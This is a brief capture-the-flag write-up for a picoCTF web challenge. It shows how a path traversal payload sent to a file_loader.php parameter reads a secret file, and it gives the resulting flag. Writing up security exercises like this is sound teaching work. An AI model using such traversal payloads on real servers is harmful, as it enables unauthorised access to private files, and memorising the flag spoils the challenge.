# Potentially Hidden Password - 100
This Daedalus Corp. website loads images in a rather odd way... Source Code

## Solution
1. On looking at the website we notice an odd way that images are sourced `http://web2014.picoctf.com/potentially-hidden-password-3878213/file_loader.php?file=zone1.jpg`

2. Let's open that url and fiddle with the file on the end, if we look at the source code we are aiming for `/resources/secrets/flag`

3. Okay try `http://web2014.picoctf.com/potentially-hidden-password-3878213/file_loader.php?file=/resources/secrets/flag` and we get the error `No such file: /resources/files//resources/secrets/flag`

4. Looking at that we can deduce that we need to go down one level then back up `http://web2014.picoctf.com/potentially-hidden-password-3878213/file_loader.php?file=/../secrets/flag`

5. That gives us the flag `i_like_being_included`
